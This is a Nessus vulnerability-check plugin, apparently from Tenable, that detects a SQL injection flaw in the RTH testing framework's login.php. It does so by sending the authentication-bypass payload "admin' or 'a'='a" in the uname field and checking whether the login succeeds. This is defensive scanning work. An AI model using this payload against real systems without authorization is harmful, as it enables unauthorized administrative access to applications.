#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33860);
  script_version("$Revision: 1.12 $");

  script_bugtraq_id(30603);
  script_osvdb_id(47568);
  script_xref(name:"Secunia", value:"31414");

  script_name(english:"RTH login.php uname Parameter SQL Injection");
  script_summary(english:"Tries to bypass authentication");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running RTH, a web-based software testing framework
written in PHP. 

The version of RTH installed on the remote host fails to sanitize
input to the 'uname' array parameter of the 'login.php' script before
using it in a database query.  Provided PHP's 'magic_quotes_gpc'
setting is disabled, an attacker can leverage this issue to manipulate
database queries and gain administrative access to the application or
launch other sorts of SQL injection attacks against the affected host. 

Note that there is also reportedly an information disclosure issue
associated with similar versions of RTH that could be used to download
arbitrary files from the remote host without authentication.  Nessus
has not, though, checked for those other issues." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?75494405" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/project/shownotes.php?release_id=618383" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to RTH version 1.7.0 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/08/11");
 script_cvs_date("$Date: 2015/09/24 23:21:20 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


user = "admin";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/rth", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Check if the login page is for RTH.
  url = string(dir, "/login.php");
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it is...
  if (
    (
      "RTH - Quality Centre" >< res ||
      ">LOGIN - RTH<" >< res ||
      "'>RTH_Admin</a>" >< res
    ) &&
    "action='login_validate.php'" >< res
  )
  {
    # Try to log in.
    url = string(dir, "/login_validate.php");

    exploit = string(user, "' or 'a'='a");
    exploit = str_replace(find:" ", replace:"+", string:exploit);

    postdata = string(
      "login[switch_project]=&",
      "login[page]=&",
      "login[get]=&",
      "uname=", exploit, "&",
      "pword=", SCRIPT_NAME
    );
    r = http_send_recv3(method:"POST", item:url, port: port,
      content_type: "application/x-www-form-urlencoded", data: postdata);
    if (isnull(r)) exit(0);
    res = strcat(r[0], r[1], '\r\n', r[2]);

    # There's a problem if...
    if (
      "URL=home_page.php" >< res &&
      "failed=true" >!< res
    )
    {
      if (report_verbosity)
      {
        report = string(
          "\n",
          "Nessus was able to bypass authentication and gain access as the user\n",
          "'", user, "' using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n",
          "\n",
          "and with the following POST data :\n",
          "\n",
          "  ", str_replace(find:"&", replace:'\n  ', string:postdata), "\n"
        );
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
